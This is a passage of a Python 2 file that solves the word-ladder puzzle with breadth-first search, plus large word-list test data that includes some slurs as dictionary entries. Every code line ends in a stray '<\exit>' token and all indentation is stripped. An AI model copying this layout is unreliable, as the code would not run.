","toads","vader","julep","licks","arias","wrote","north","bunks","heady","batch","snaps","claws","fouls","faded","beans","wimps","idled","pulse","goons","noose","vowed","ronda","rajas","roast","allah","punic","slows","hours","metal","slier","meaty","hanna","curvy","mussy","truth","troys","block","reels","print","miffs","busts","bytes","cream","otter","grads","siren","kilos","dross","batty","debts","sully","bares","baggy","hippy","berth","gorky","argon","wacko","harry","smoke","fails","perms","score","steps","unity","couch","kelly","rumps","fines","mouth","broth","knows","becky","quits","lauri","trust","grows","logos","apter","burrs","zincs","buyer","bayer","moose","overt","croon","ousts","lands","lithe","poach","jamel","waive","wiser","surly","works","paine","medal","glads","gybed","paint","lorre","meant","smugs","bryon","jinni","sever","viols","flubs","melts","heads","peals","aiken","named","teary","yalta","styes","heist","bongs","slops","pouts","grape","belie","cloak","rocks","scone","lydia","goofs","rents","drive","crony","orlon","narks","plays","blips","pence","march","alger","baste","acorn","billy","croce","boone","aaron","slobs","idyls","irwin","elves","stoat","doing","globe","verve","icons","trial","olsen","pecks","there","blame","tilde","milky","sells","tangy","wrack","fills","lofty","truce","quark","delia","stowe","marty","overs","putty","coral","swine","stats","swags","weans","spout","bulky","farsi","brest","gleam","beaks","coons","hater","peony","huffy","exert","clips","riven","payer","doped","salas","meyer","dryad","thuds","tilts","quilt","jetty","brood","gulch","corps","tunic","hubby","slang","wreck","purrs","punch","drags","chide","sulks","tints","huger","roped","dopes","booby","rosin","outer","gusto","tents","elude","brows","lease","ceres","laxer","worth","necks","races","corey","trait","stuns","soles","teems","scrip","privy","sight","minor","alisa","stray","spank","cress","nukes","rises","gusts","aurae","karma","icing","prose","biked","grand","grasp","skein","shaky","clump","rummy","stock","twain","zoned","offed","ghats","mover","randy","vault","craws","thees","salem","downy","sangs","chore","cited","grave","spinx","erica","raspy","dying","skips","clerk","paste","moved","rooks","intel","moses","avers","staid","yawls","blast","lyres","monks","gaits","floor","saner","waver","assam","infer","wands","bunch","dryly","weedy","honey","baths","leach","shorn","shows","dream","value","dooms","spiro","raped","shook","stead","moran","ditto","loots","tapir","looms","clove","stops","pinks","soppy","ripen","wench","shone","bauds","doric","leans","nadia","cries","camus","boozy","maris","fools","morns","bides","greek","gauss","roget","lamar","hazes","beefy","dupes","refed","felts","larry","guile","ables","wants","warns","toils","bathe","edger","paced","rinks","shoos","erich","whore","tiger","jumpy","lamas","stack","among","punts","scalp","alloy","solon","quite","comas","whole","parse","tries","reeve","tiled","deena","roomy","rodin","aster","twice","musts","globs","parch","drawn","filch","bonds","tells","droop","janis","holds","scant","lopes","based","keven","whiny","aspic","gains","franz","jerri","steel","rowel","vends","yelps","begin","logic","tress","sunni","going","barge","blood","burns","basks","waifs","bones","skill","hewer","burly","clime","eking","withs","capek","berta","cheap","films","scoot","tweed","sizer","wheat","acton","flung","ponds","tracy","fiver","berra","roger","mutes","burke","miked","valve","whisk","runes","parry","toots","japes","roars","rough","irons","romeo","cages","reeks","cigar","saiph","dully","hangs","chops","rolls","prick","acuff","spent","sulla","train","swell","frets","names","anita","crazy","sixth","blunt","fewer","large","brand","slick","spitz","rears","ogres","toffy","yolks","flock","gnawn","eries","blink","skier","feted","tones","snail","ether","barbs","noses","hears","upset","awash","cloud","trunk","degas","dungs","rated","shall","yeahs","coven","sands","susan","fable","gunny","began","serfs","balls","dinky","madge","prong","spilt","lilly","brawn","comet","spins","raids","dries","sorts","makes","mason","mayra","royce","stout","mealy","pagan","nasal","folds","libby","coups","photo","mosey","amens","speed","lords","board","fetal","lagos","scope","raked","bonus","mutts","willy","sport","bingo","thant","araby","bette","rebel","gases","small","humus","grosz","beset","slays","steve","scrap","blahs","south","pride","heels","tubes","beady","lacey","genus","mauls","vying","spice","sexes","ester","drams","today","comae","under","jests","direr","yoked","tempi","early","boats","jesus","warts","guppy","gilda","quota","token","edwin","ringo","gaped","lemon","hurst","manor","arrow","mists","prize","silas","blobs","diets","ervin","stony","buddy","bates","rabid","ducat","ewing","jaunt","beads","doyen","blush","thoth","tiles","piper","short","peron","alley","decks","shunt","whirs","cushy","roils","betty","plugs","woken","jibes","foray","merak","ruing","becks","whale","shoot","dwelt","spawn","fairs","dozed","celts","blond","tikes","sabin","feint","vamps","cokes","willa","slues","bills","force","curst","yokel","surer","miler","fices","arced","douse","hilly","lucio","tongs","togas","minty","sagas","pates","welsh","bruno","decal","elate","linux","gyros","pryor","mousy","pains","shake","spica","pupal","probe","mount","shirk","purus","kilns","rests","graze","hague","spuds","sweep","momma","burch","maces","samar","brace","riser","booms","build","camel","flyer","synge","sauna","tonga","tings","promo","hides","clair","elisa","bower","reins","diann","lubed","nulls","picks","laban","milch","buber","stomp","bosom","lying","haled","avert","wries","macon","skids","fumed","ogles","clods","antic","nosey","crimp","purge","mommy","cased","taxes","covet","clack","butch","panty","lents","machs","exude","tooth","adore","shuck","asses","after","terra","dices","aryan","regor","romes","stile","cairo","maura","flail","eaves","estes","sousa","visas","baron","civet","kitty","freed","ralph","tango","gawks","cheat","study","fancy","fiber","musks","souse","brims","claim","bikes","venue","sired","thymi","rivas","skimp","pleas","woman","gimpy","cawed","minos","pints","knock","poked","bowen","risky","towel","oinks","linus","heals","pears","codas","inner","pitch","harpy","niger","madly","bumpy","stair","files","nobel","celli","spars","jades","balmy","kooky","plums","trues","gloss","trims","daunt","tubby","dared","wadis","smell","darby","stink","drill","dover","ruler","laden","dikes","layla","fells","maker","joked","horns","these","baize","spahn","whens","edged","mushy","plume","tucks","spurs","husky","dried","bigot","pupas","drily","aware","hagar","newly","knots","pratt","feces","sabik","watts","cooke","riles","seamy","fleas","dusts","barfs","roans","pawns","vivid","kirks","tania","feral","tubae","horne","aries","brits","combs","chunk","stork","waned","texan","elide","glens","emery","autos","trams","dosed","cheri","baits","jacks","whose","fazed","matte","swans","maxed","write","spays","orion","traci","horse","stars","strut","goods","verge","scuff","award","dives","wires","burnt","dimly","sleds","mayan","biped","quirk","sofia","slabs","waste","robby","mayor","fatty","items","bowel","mires","swarm","route","swash","sooth","paved","steak","upend","sough","throw","perts","stave","carry","burgs","hilts","plane","toady","nadir","stick","foist","gnarl","spain","enter","sises","story","scarf","ryder","glums","nappy","sixes","honed","marcy","offer","kneel","leeds","lites","voter","vince","bursa","heave","roses","trees","argos","leann","grimy","zelma","crick","tract","flips","folks","smote","brier","moore","goose","baden","riled","looks","sober","tusks","house","acmes","lubes","chows","neath","vivas","defer","allay","casey","kmart","pests","proms","eying","cider","leave","shush","shots","karla","scorn","gifts","sneer","mercy","copes","faxed","spurt","monet","awoke","rocky","share","gores","drawl","tears","mooed","nones","wined","wrens","modem","beria","hovel","retch","mates","hands","stymy","peace","carat","coots","hotel","karen","hayed","mamet","cuing","paper","rages","suave","reuse","auden","costs","loner","rapes","hazel","rites","brent","pumps","dutch","puffs","noons","grams","teats","cease","honda","pricy","forgo","fleck","hired","silos","merge","rafts","halon","larks","deere","jello","cunts","sifts","boner","morin","mimes","bungs","marie","harts","snobs","sonic","hippo","comes","crops","mango","wrung","garbs","natty","cents","fitch","moldy","adams","sorta","coeds","gilds","kiddy","nervy","slurp","ramon","fuzed","hiker","winks","vanes","goody","hawks","crowd","bract","marla","limbs","solve","gloom","sloop","eaton","memos","tames","heirs","berms","wanes","faint","numbs","holes","grubs","rakes","waist","miser","stays","antis","marsh","skyed","payne","champ","jimmy","clues","fatal","shoed","freon","lopez","snowy","loins","stale","thank","reads","isles","grill","align","saxes","rubin","rigel","walls","beers","wispy","topic","alden","anton","ducts","david","duets","fries","oiled","waken","allot","swats","woozy","tuxes","inter","dunne","known","axles","graph","bumps","jerry","hitch","crews","lucia","banal","grope","valid","meres","thick","lofts","chaff","taker","glues","snubs","trawl","keels","liker","stand","harps","casks","nelly","debby","panes","dumps","norma","racks","scams","forte","dwell","dudes","hypos","sissy","swamp","faust","slake","maven","lowed","lilts","bobby","gorey","swear","nests","marci","palsy","siege","oozes","rates","stunt","herod","wilma","other","girts","conic","goner","peppy","class","sized","games","snell","newsy","amend","solis","duane","troop","linda","tails","woofs","scuds","shies","patti","stunk","acres","tevet","allen","carpi","meets","trend","salty","galls","crept","toner","panda","cohen","chase","james","bravo","styed","coals","oates","swami","staph","frisk","cares","cords","stems","razed","since","mopes","rices","junes","raged","liter","manes","rearm","naive","tyree","medic","laded","pearl","inset","graft","chair","votes","saver","cains","knobs","gamay","hunch","crags","olson","teams","surge","wests","boney","limos","ploys","algae","gaols","caked","molts","glops","tarot","wheal","cysts","husks","vaunt","beaus","fauns","jeers","mitty","stuff","shape","sears","buffy","maced","fazes","vegas","stamp","borer","gaged","shade","finds","frock","plods","skied","stump","ripes","chick","cones","fixed","coled","rodeo","basil","dazes","sting","surfs","mindy","creak","swung","cadge","franc","seven","sices","weest","unite","codex","trick","fusty","plaid","hills","truck","spiel","sleek","anons","pupae","chiba","hoops","trash","noted","boris","dough","shirt","cowls","seine","spool","miens","yummy","grade","proxy","hopes","girth","deter","dowry","aorta","paean","corms","giant","shank","where","means","years","vegan","derek","tales"]))<\exit>
class Solution:<\exit>
def is_neighbor(self, p, q):<\exit>
diff = 0<\exit>
for a, b in zip(p, q):<\exit>
if a != b:<\exit>
diff += 1<\exit>
if diff > 1:<\exit>
return False<\exit>
return True<\exit>
def ladderLength(self, start, end, dct):<\exit>
q = [start]<\exit>
visited = {start}<\exit>
lvl = 1<\exit>
while q:<\exit>
cur_q = []<\exit>
for a in q:<\exit>
if a == end:<\exit>
return lvl<\exit>
for b in dct:<\exit>
if b not in visited and self.is_neighbor(a, b):<\exit>
visited.add(b)<\exit>
cur_q.append(b)<\exit>
lvl += 1<\exit>
q = cur_q<\exit>
return 0<\exit>
def ladderLength_TLE(self, start, end, dict):<\exit>
lst = [start]+list(dict)<\exit>
dp = [[-1 for _ in lst] for _ in lst]<\exit>
def diff_count(s1, s2):<\exit>
count = 0<\exit>
str1 = lst[s1]<\exit>
str2 = lst[s2]<\exit>
for i in xrange(len(str1)):<\exit>
if count>1:<\exit>
return -1<\exit>
if str1[i]!=str2[i]:<\exit>
count += 1<\exit>
return count<\exit>
for i in xrange(len(lst)):<\exit>
for j in xrange(i, len(lst)):<\exit>
dp[i][j] = diff_count(i, j)<\exit>
dp[j][i] = dp[i][j]<\exit>
visited = [False for _ in lst]<\exit>
path_len = 0<\exit>
queue = [0]<\exit>
visited[0] = True<\exit>
while queue:<\exit>
path_len += 1<\exit>
length = len(queue)<\exit>
for i in xrange(length):<\exit>
if lst[queue[i]]==end:<\exit>
return path_len<\exit>
for ind in xrange(1, len(lst)):<\exit>
if not visited[ind] and dp[ind][queue[i]]==1:<\exit>
queue.append(ind)<\exit>
visited[ind] = True<\exit>
queue = queue[length:]<\exit>
return path_len<\exit>
def ladderLength_TLE2(self, start, end, dict):<\exit>
def diff_count(str1, str2):<\exit>
count = 0<\exit>
for i in xrange(len(str1)):<\exit>
if count>1:<\exit>
return -1<\exit>
if str1[i]!=str2[i]:<\exit>
count += 1<\exit>
return count<\exit>
path_len = 0<\exit>
queue = [start]<\exit>
while queue:<\exit>
path_len += 1<\exit>
length = len(queue)<\exit>
for i in xrange(length):<\exit>
if queue[i]==end:<\exit>
return path_len<\exit>
remain_set = set(dict)<\exit>
for item in dict:<\exit>
if diff_count(item, queue[i])==1:<\exit>
queue.append(item)<\exit>
remain_set.remove(item)<\exit>
dict = remain_set<\exit>
queue = queue[length:]<\exit>
return path_len<\exit>
def ladderLength_complex(self, start, end, dict):<\exit>
path_len = 0<\exit>
lower_cases = [chr(i+ord('a')) for i in xrange(26)]<\exit>
queue = [start]<\exit>
dict.remove(start)<\exit>
while True:<\exit>
path_len += 1<\exit>
length_0 = len(queue)<\exit>
for i in xrange(length_0):<\exit>
current = queue[i]<\exit>
if current==end:<\exit>
return path_len<\exit>
current = queue[i]<\exit>
for pos in xrange(len(current)):<\exit>
lst = list(current)<\exit>
for char in lower_cases:<\exit>
lst[pos] = char<\exit>
temp = "".join(lst)<\exit>
if temp in dict:<\exit>
queue.append(temp)<\exit>
dict.remove(temp)<\exit>
queue = queue[length_0:]<\exit>
if not queue:<\exit>
return 0<\exit>
return path_len<\exit>
if __name__=="__main__":<\exit>
assert Solution().ladderLength("sand", "acne", set(<\exit>
["slit", "bunk", "wars", "ping", "viva", "wynn", "wows", "irks", "gang", "pool", "mock", "fort", "heel", "send",<\exit>
"ship", "cols", "alec", "foal", "nabs", "gaze", "giza", "mays", "dogs", "karo", "cums", "jedi", "webb", "lend",<\exit>
"mire", "jose", "catt", "grow", "toss", "magi", "leis", "bead", "kara", "hoof", "than", "ires", "baas", "vein",<\exit>
"kari", "riga", "oars", "gags", "thug", "yawn", "wive", "view", "germ", "flab", "july", "tuck", "rory", "bean",<\exit>
"feed", "rhee", "jeez", "gobs", "lath", "desk", "yoko", "cute", "zeus", "thus", "dims", "link", "dirt", "mara",<\exit>
"disc", "limy", "lewd", "maud", "duly", "elsa", "hart", "rays", "rues", "camp", "lack", "okra", "tome", "math",<\exit>
"plug", "monk", "orly", "friz", "hogs", "yoda", "poop", "tick", "plod", "cloy", "pees", "imps", "lead", "pope",<\exit>
"mall", "frey", "been", "plea", "poll", "male", "teak", "soho", "glob", "bell", "mary", "hail", "scan", "yips",<\exit>
"like", "mull", "kory", "odor", "byte", "kaye", "word", "honk", "asks", "slid", "hopi", "toke", "gore", "flew",<\exit>
"tins", "mown", "oise", "hall", "vega", "sing", "fool", "boat", "bobs", "lain", "soft", "hard", "rots", "sees",<\exit>
"apex", "chan", "told", "woos", "unit", "scow", "gilt", "beef", "jars", "tyre", "imus", "neon", "soap", "dabs",<\exit>
"rein", "ovid", "hose", "husk", "loll", "asia", "cope", "tail", "hazy", "clad", "lash", "sags", "moll", "eddy",<\exit>
"fuel", "lift", "flog", "land", "sigh", "saks", "sail", "hook", "visa", "tier", "maws", "roeg", "gila", "eyes",<\exit>
"noah", "hypo", "tore", "eggs", "rove", "chap", "room", "wait", "lurk", "race", "host", "dada", "lola", "gabs",<\exit>
"sobs", "joel", "keck", "axed", "mead", "gust", "laid", "ends", "oort", "nose", "peer", "kept", "abet", "iran",<\exit>
"mick", "dead", "hags", "tens", "gown", "sick", "odis", "miro", "bill", "fawn", "sumo", "kilt", "huge", "ores",<\exit>
"oran", "flag", "tost", "seth", "sift", "poet", "reds", "pips", "cape", "togo", "wale", "limn", "toll", "ploy",<\exit>
"inns", "snag", "hoes", "jerk", "flux", "fido", "zane", "arab", "gamy", "raze", "lank", "hurt", "rail", "hind",<\exit>
"hoot", "dogy", "away", "pest", "hoed", "pose", "lose", "pole", "alva", "dino", "kind", "clan", "dips", "soup",<\exit>
"veto", "edna", "damp", "gush", "amen", "wits", "pubs", "fuzz", "cash", "pine", "trod", "gunk", "nude", "lost",<\exit>
"rite", "cory", "walt", "mica", "cart", "avow", "wind", "book", "leon", "life", "bang", "draw", "leek", "skis",<\exit>
"dram", "ripe", "mine", "urea", "tiff", "over", "gale", "weir", "defy", "norm", "tull", "whiz", "gill", "ward",<\exit>
"crag", "when", "mill", "firs", "sans", "flue", "reid", "ekes", "jain", "mutt", "hems", "laps", "piss", "pall",<\exit>
"rowe", "prey", "cull", "knew", "size", "wets", "hurl", "wont", "suva", "girt", "prys", "prow", "warn", "naps",<\exit>
"gong", "thru", "livy", "boar", "sade", "amok", "vice", "slat", "emir", "jade", "karl", "loyd", "cerf", "bess",<\exit>
"loss", "rums", "lats", "bode", "subs", "muss", "maim", "kits", "thin", "york", "punt", "gays", "alpo", "aids",<\exit>
"drag", "eras", "mats", "pyre", "clot", "step", "oath", "lout", "wary", "carp", "hums", "tang", "pout", "whip",<\exit>
"fled", "omar", "such", "kano", "jake", "stan", "loop", "fuss", "mini", "byrd", "exit", "fizz", "lire", "emil",<\exit>
"prop", "noes", "awed", "gift", "soli", "sale", "gage", "orin", "slur", "limp", "saar", "arks", "mast", "gnat",<\exit>
"port", "into", "geed", "pave", "awls", "cent", "cunt", "full", "dint", "hank", "mate", "coin", "tars", "scud",<\exit>
"veer", "coax", "bops", "uris", "loom", "shod", "crib", "lids", "drys", "fish", "edit", "dick", "erna", "else",<\exit>
"hahs", "alga", "moho", "wire", "fora", "tums", "ruth", "bets", "duns", "mold", "mush", "swop", "ruby", "bolt",<\exit>
"nave", "kite", "ahem", "brad", "tern", "nips", "whew", "bait", "ooze", "gino", "yuck", "drum", "shoe", "lobe",<\exit>
"dusk", "cult", "paws", "anew", "dado", "nook", "half", "lams", "rich", "cato", "java", "kemp", "vain", "fees",<\exit>
"sham", "auks", "gish", "fire", "elam", "salt", "sour", "loth", "whit", "yogi", "shes", "scam", "yous", "lucy",<\exit>
"inez", "geld", "whig", "thee", "kelp", "loaf", "harm", "tomb", "ever", "airs", "page", "laud", "stun", "paid",<\exit>
"goop", "cobs", "judy", "grab", "doha", "crew", "item", "fogs", "tong", "blip", "vest", "bran", "wend", "bawl",<\exit>
"feel", "jets", "mixt", "tell", "dire", "devi", "milo", "deng", "yews", "weak", "mark", "doug", "fare", "rigs",<\exit>
"poke", "hies", "sian", "suez", "quip", "kens", "lass", "zips", "elva", "brat", "cosy", "teri", "hull", "spun",<\exit>
"russ", "pupa", "weed", "pulp", "main", "grim", "hone", "cord", "barf", "olav", "gaps", "rote", "wilt", "lars",<\exit>
"roll", "balm", "jana", "give", "eire", "faun", "suck", "kegs", "nita", "weer", "tush", "spry", "loge", "nays",<\exit>
"heir", "dope", "roar", "peep", "nags", "ates", "bane", "seas", "sign", "fred", "they", "lien", "kiev", "fops",<\exit>
"said", "lawn", "lind", "miff", "mass", "trig", "sins", "furl", "ruin", "sent", "cray", "maya", "clog", "puns",<\exit>
"silk", "axis", "grog", "jots", "dyer", "mope", "rand", "vend", "keen", "chou", "dose", "rain", "eats", "sped",<\exit>
"maui", "evan", "time", "todd", "skit", "lief", "sops", "outs", "moot", "faze", "biro", "gook", "fill", "oval",<\exit>
"skew", "veil", "born", "slob", "hyde", "twin", "eloy", "beat", "ergs", "sure", "kobe", "eggo", "hens", "jive",<\exit>
"flax", "mons", "dunk", "yest", "begs", "dial", "lodz", "burp", "pile", "much", "dock", "rene", "sago", "racy",<\exit>
"have", "yalu", "glow", "move", "peps", "hods", "kins", "salk", "hand", "cons", "dare", "myra", "sega", "type",<\exit>
"mari", "pelt", "hula", "gulf", "jugs", "flay", "fest", "spat", "toms", "zeno", "taps", "deny", "swag", "afro",<\exit>
"baud", "jabs", "smut", "egos", "lara", "toes", "song", "fray", "luis", "brut", "olen", "mere", "ruff", "slum",<\exit>
"glad", "buds", "silt", "rued", "gelt", "hive", "teem", "ides", "sink", "ands", "wisp", "omen", "lyre", "yuks",<\exit>
"curb", "loam", "darn", "liar", "pugs", "pane", "carl", "sang", "scar", "zeds", "claw", "berg", "hits", "mile",<\exit>
"lite", "khan", "erik", "slug", "loon", "dena", "ruse", "talk", "tusk", "gaol", "tads", "beds", "sock", "howe",<\exit>
"gave", "snob", "ahab", "part", "meir", "jell", "stir", "tels", "spit", "hash", "omit", "jinx", "lyra", "puck",<\exit>
"laue", "beep", "eros", "owed", "cede", "brew", "slue", "mitt", "jest", "lynx", "wads", "gena", "dank", "volt",<\exit>
"gray", "pony", "veld", "bask", "fens", "argo", "work", "taxi", "afar", "boon", "lube", "pass", "lazy", "mist",<\exit>
"blot", "mach", "poky", "rams", "sits", "rend", "dome", "pray", "duck", "hers", "lure", "keep", "gory", "chat",<\exit>
"runt", "jams", "lays", "posy", "bats", "hoff", "rock", "keri", "raul", "yves", "lama", "ramp", "vote", "jody",<\exit>
"pock", "gist", "sass", "iago", "coos", "rank", "lowe", "vows", "koch", "taco", "jinn", "juno", "rape", "band",<\exit>
"aces", "goal", "huck", "lila", "tuft", "swan", "blab", "leda", "gems", "hide", "tack", "porn", "scum", "frat",<\exit>
"plum", "duds", "shad", "arms", "pare", "chin", "gain", "knee", "foot", "line", "dove", "vera", "jays", "fund",<\exit>
"reno", "skid", "boys", "corn", "gwyn", "sash", "weld", "ruiz", "dior", "jess", "leaf", "pars", "cote", "zing",<\exit>
"scat", "nice", "dart", "only", "owls", "hike", "trey", "whys", "ding", "klan", "ross", "barb", "ants", "lean",<\exit>
"dopy", "hock", "tour", "grip", "aldo", "whim", "prom", "rear", "dins", "duff", "dell", "loch", "lava", "sung",<\exit>
"yank", "thar", "curl", "venn", "blow", "pomp", "heat", "trap", "dali", "nets", "seen", "gash", "twig", "dads",<\exit>
"emmy", "rhea", "navy", "haws", "mite", "bows", "alas", "ives", "play", "soon", "doll", "chum", "ajar", "foam",<\exit>
"call", "puke", "kris", "wily", "came", "ales", "reef", "raid", "diet", "prod", "prut", "loot", "soar", "coed",<\exit>
"celt", "seam", "dray", "lump", "jags", "nods", "sole", "kink", "peso", "howl", "cost", "tsar", "uric", "sore",<\exit>
"woes", "sewn", "sake", "cask", "caps", "burl", "tame", "bulk", "neva", "from", "meet", "webs", "spar", "fuck",<\exit>
"buoy", "wept", "west", "dual", "pica", "sold", "seed", "gads", "riff", "neck", "deed", "rudy", "drop", "vale",<\exit>
"flit", "romp", "peak", "jape", "jews", "fain", "dens", "hugo", "elba", "mink", "town", "clam", "feud", "fern",<\exit>
"dung", "newt", "mime", "deem", "inti", "gigs", "sosa", "lope", "lard", "cara", "smug", "lego", "flex", "doth",<\exit>
"paar", "moon", "wren", "tale", "kant", "eels", "muck", "toga", "zens", "lops", "duet", "coil", "gall", "teal",<\exit>
"glib", "muir", "ails", "boer", "them", "rake", "conn", "neat", "frog", "trip", "coma", "must", "mono", "lira",<\exit>
"craw", "sled", "wear", "toby", "reel", "hips", "nate", "pump", "mont", "died", "moss", "lair", "jibe", "oils",<\exit>
"pied", "hobs", "cads", "haze", "muse", "cogs", "figs", "cues", "roes", "whet", "boru", "cozy", "amos", "tans",<\exit>
"news", "hake", "cots", "boas", "tutu", "wavy", "pipe", "typo", "albs", "boom", "dyke", "wail", "woke", "ware",<\exit>
"rita", "fail", "slab", "owes", "jane", "rack", "hell", "lags", "mend", "mask", "hume", "wane", "acne", "team",<\exit>
"holy", "runs", "exes", "dole", "trim", "zola", "trek", "puma", "wacs", "veep", "yaps", "sums", "lush", "tubs",<\exit>
"most", "witt", "bong", "rule", "hear", "awry", "sots", "nils", "bash", "gasp", "inch", "pens", "fies", "juts",<\exit>
"pate", "vine", "zulu", "this", "bare", "veal", "josh", "reek", "ours", "cowl", "club", "farm", "teat", "coat",<\exit>
"dish", "fore", "weft", "exam", "vlad", "floe", "beak", "lane", "ella", "warp", "goth", "ming", "pits", "rent",<\exit>
"tito", "wish", "amps", "says", "hawk", "ways", "punk", "nark", "cagy", "east", "paul", "bose", "solo", "teed",<\exit>
"text", "hews", "snip", "lips", "emit", "orgy", "icon", "tuna", "soul", "kurd", "clod", "calk", "aunt", "bake",<\exit>
"copy", "acid", "duse", "kiln", "spec", "fans", "bani", "irma", "pads", "batu", "logo", "pack", "oder", "atop",<\exit>
"funk", "gide", "bede", "bibs", "taut", "guns", "dana", "puff", "lyme", "flat", "lake", "june", "sets", "gull",<\exit>
"hops", "earn", "clip", "fell", "kama", "seal", "diaz", "cite", "chew", "cuba", "bury", "yard", "bank", "byes",<\exit>
"apia", "cree", "nosh", "judo", "walk", "tape", "taro", "boot", "cods", "lade", "cong", "deft", "slim", "jeri",<\exit>
"rile", "park", "aeon", "fact", "slow", "goff", "cane", "earp", "tart", "does", "acts", "hope", "cant", "buts",<\exit>
"shin", "dude", "ergo", "mode", "gene", "lept", "chen", "beta", "eden", "pang", "saab", "fang", "whir", "cove",<\exit>
"perk", "fads", "rugs", "herb", "putt", "nous", "vane", "corm", "stay", "bids", "vela", "roof", "isms", "sics",<\exit>
"gone", "swum", "wiry", "cram", "rink", "pert", "heap", "sikh", "dais", "cell", "peel", "nuke", "buss", "rasp",<\exit>
"none", "slut", "bent", "dams", "serb", "dork", "bays", "kale", "cora", "wake", "welt", "rind", "trot", "sloe",<\exit>
"pity", "rout", "eves", "fats", "furs", "pogo", "beth", "hued", "edam", "iamb", "glee", "lute", "keel", "airy",<\exit>
"easy", "tire", "rube", "bogy", "sine", "chop", "rood", "elbe", "mike", "garb", "jill", "gaul", "chit", "dons",<\exit>
"bars", "ride", "beck", "toad", "make", "head", "suds", "pike", "snot", "swat", "peed", "same", "gaza", "lent",<\exit>
"gait", "gael", "elks", "hang", "nerf", "rosy", "shut", "glop", "pain", "dion", "deaf", "hero", "doer", "wost",<\exit>
"wage", "wash", "pats", "narc", "ions", "dice", "quay", "vied", "eons", "case", "pour", "urns", "reva", "rags",<\exit>
"aden", "bone", "rang", "aura", "iraq", "toot", "rome", "hals", "megs", "pond", "john", "yeps", "pawl", "warm",<\exit>
"bird", "tint", "jowl", "gibe", "come", "hold", "pail", "wipe", "bike", "rips", "eery", "kent", "hims", "inks",<\exit>
"fink", "mott", "ices", "macy", "serf", "keys", "tarp", "cops", "sods", "feet", "tear", "benz", "buys", "colo",<\exit>
"boil", "sews", "enos", "watt", "pull", "brag", "cork", "save", "mint", "feat", "jamb", "rubs", "roxy", "toys",<\exit>
"nosy", "yowl", "tamp", "lobs", "foul", "doom", "sown", "pigs", "hemp", "fame", "boor", "cube", "tops", "loco",<\exit>
"lads", "eyre", "alta", "aged", "flop", "pram", "lesa", "sawn", "plow", "aral", "load", "lied", "pled", "boob",<\exit>
"bert", "rows", "zits", "rick", "hint", "dido", "fist", "marc", "wuss", "node", "smog", "nora", "shim", "glut",<\exit>
"bale", "perl", "what", "tort", "meek", "brie", "bind", "cake", "psst", "dour", "jove", "tree", "chip", "stud",<\exit>
"thou", "mobs", "sows", "opts", "diva", "perm", "wise", "cuds", "sols", "alan", "mild", "pure", "gail", "wins",<\exit>
"offs", "nile", "yelp", "minn", "tors", "tran", "homy", "sadr", "erse", "nero", "scab", "finn", "mich", "turd",<\exit>
"then", "poem", "noun", "oxus", "brow", "door", "saws", "eben", "wart", "wand", "rosa", "left", "lina", "cabs",<\exit>
"rapt", "olin", "suet", "kalb", "mans", "dawn", "riel", "temp", "chug", "peal", "drew", "null", "hath", "many",<\exit>
"took", "fond", "gate", "sate", "leak", "zany", "vans", "mart", "hess", "home", "long", "dirk", "bile", "lace",<\exit>
"moog", "axes", "zone", "fork", "duct", "rico", "rife", "deep", "tiny", "hugh", "bilk", "waft", "swig", "pans",<\exit>
"with", "kern", "busy", "film", "lulu", "king", "lord", "veda", "tray", "legs", "soot", "ells", "wasp", "hunt",<\exit>
"earl", "ouch", "diem", "yell", "pegs", "blvd", "polk", "soda", "zorn", "liza", "slop", "week", "kill", "rusk",<\exit>
"eric", "sump", "haul", "rims", "crop", "blob", "face", "bins", "read", "care", "pele", "ritz", "beau", "golf",<\exit>
"drip", "dike", "stab", "jibs", "hove", "junk", "hoax", "tats", "fief", "quad", "peat", "ream", "hats", "root",<\exit>
"flak", "grit", "clap", "pugh", "bosh", "lock", "mute", "crow", "iced", "lisa", "bela", "fems", "oxes", "vies",<\exit>
"gybe", "huff", "bull", "cuss", "sunk", "pups", "fobs", "turf", "sect", "atom", "debt", "sane", "writ", "anon",<\exit>
"mayo", "aria", "seer", "thor", "brim", "gawk", "jack", "jazz", "menu", "yolk", "surf", "libs", "lets", "bans",<\exit>
"toil", "open", "aced", "poor", "mess", "wham", "fran", "gina", "dote", "love", "mood", "pale", "reps", "ines",<\exit>
"shot", "alar", "twit", "site", "dill", "yoga", "sear", "vamp", "abel", "lieu", "cuff", "orbs", "rose", "tank",<\exit>
"gape", "guam", "adar", "vole", "your", "dean", "dear", "hebe", "crab", "hump", "mole", "vase", "rode", "dash",<\exit>
"sera", "balk", "lela", "inca", "gaea", "bush", "loud", "pies", "aide", "blew", "mien", "side", "kerr", "ring",<\exit>
"tess", "prep", "rant", "lugs", "hobo", "joke", "odds", "yule", "aida", "true", "pone", "lode", "nona", "weep",<\exit>
"coda", "elmo", "skim", "wink", "bras", "pier", "bung", "pets", "tabs", "ryan", "jock", "body", "sofa", "joey",<\exit>
"zion", "mace", "kick", "vile", "leno", "bali", "fart", "that", "redo", "ills", "jogs", "pent", "drub", "slaw",<\exit>
"tide", "lena", "seep", "gyps", "wave", "amid", "fear", "ties", "flan", "wimp", "kali", "shun", "crap", "sage",<\exit>
"rune", "logs", "cain", "digs", "abut", "obit", "paps", "rids", "fair", "hack", "huns", "road", "caws", "curt",<\exit>
"jute", "fisk", "fowl", "duty", "holt", "miss", "rude", "vito", "baal", "ural", "mann", "mind", "belt", "clem",<\exit>
"last", "musk", "roam", "abed", "days", "bore", "fuze", "fall", "pict", "dump", "dies", "fiat", "vent", "pork",<\exit>
"eyed", "docs", "rive", "spas", "rope", "ariz", "tout", "game", "jump", "blur", "anti", "lisp", "turn", "sand",<\exit>
"food", "moos", "hoop", "saul", "arch", "fury", "rise", "diss", "hubs", "burs", "grid", "ilks", "suns", "flea",<\exit>
"soil", "lung", "want", "nola", "fins", "thud", "kidd", "juan", "heps", "nape", "rash", "burt", "bump", "tots",<\exit>
"brit", "mums", "bole", "shah", "tees", "skip", "limb", "umps", "ache", "arcs", "raft", "halo", "luce", "bahs",<\exit>
"leta", "conk", "duos", "siva", "went", "peek", "sulk", "reap", "free", "dubs", "lang", "toto", "hasp", "ball",<\exit>
"rats", "nair", "myst", "wang", "snug", "nash", "laos", "ante", "opal", "tina", "pore", "bite", "haas", "myth",<\exit>
"yugo", "foci", "dent", "bade", "pear", "mods", "auto", "shop", "etch", "lyly", "curs", "aron", "slew", "tyro",<\exit>
"sack", "wade", "clio", "gyro", "butt", "icky", "char", "itch", "halt", "gals", "yang", "tend", "pact", "bees",<\exit>
"suit", "puny", "hows", "nina", "brno", "oops", "lick", "sons", "kilo", "bust", "nome", "mona", "dull", "join",<\exit>
